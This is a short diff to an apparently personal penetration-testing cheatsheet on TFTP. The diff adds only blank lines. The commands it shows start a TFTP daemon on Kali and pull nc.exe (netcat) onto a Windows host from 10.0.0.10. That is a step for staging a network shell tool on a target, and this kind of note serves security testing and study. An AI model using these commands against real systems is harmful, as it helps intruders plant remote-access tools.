@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # TFTP Cheatsheet
 
+
+
 **Command** ([[Enable TFTP on Kali (windows binaries)]]):
 
 ```bash
@@ -17,9 +19,21 @@ atfpd --daemon --port 69 /tftp
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Win > Pull a file from tftp]]):
 
 ```bash
 c:\ tftp -i 10.0.0.10 get nc.exe
 
 ```
+
+
+
+
+
+
